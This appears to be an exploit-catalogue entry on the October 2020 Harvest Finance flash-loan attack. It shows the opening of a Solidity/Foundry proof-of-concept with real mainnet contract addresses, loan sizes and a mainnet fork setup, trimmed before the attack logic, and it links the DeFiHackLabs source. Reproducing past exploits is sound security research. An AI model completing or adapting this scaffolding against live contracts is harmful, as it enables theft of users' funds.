# [?] Harvest Finance - Flashloan Attack

## Summary
Severity: Unknown
Chain: Ethereum
Component: HarvestFinance
Published: 2020-10-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-10/HarvestFinance_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    // CONTRACTS
    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    // Curve y swap
    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    // Harvest USDC pool
    IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // ERC20s
    // 6 decimals on usdt
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // 6 decimals on usdc
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // 6 decimals on yusdc
    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    // 6 decimals on yusdt
    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    // 6 decimals on fUSDT
    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    // 6 decimals on fUSDC
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    uint256 usdcLoan = 50_000_000 * 10 ** 6;
    uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000;
    uint256 usdtLoan = 17_300_000 * 10 ** 6;
    uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;
    uint256 usdcBal;
    uint256 usdtBal;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 11_129_473); //fork mainnet at block 11129473
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-10/HarvestFinance_exp.sol_
